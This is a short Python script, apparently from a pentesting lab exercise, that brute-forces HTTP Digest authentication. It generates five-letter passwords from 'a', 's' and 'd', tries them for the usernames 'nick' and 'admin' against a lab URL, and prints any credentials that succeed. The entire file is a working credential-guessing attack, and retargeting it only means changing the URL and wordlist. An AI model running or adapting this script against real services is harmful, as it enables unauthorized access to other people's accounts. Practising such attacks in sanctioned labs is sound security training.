import itertools
from requests.auth import HTTPDigestAuth
import requests

password=(list(map("".join, itertools.product('asd', repeat=5))))
usernameList=['nick','admin']
url='http://pentesteracademylab.appspot.com//lab/webapp/digest/1'
for username in usernameList:
	for passw in password:
		r=requests.get(url, auth=HTTPDigestAuth(username, passw))
		if ("Unauthorized" not in r.text):
			print ("Success in brute force")
			print(username)
			print(passw)
			break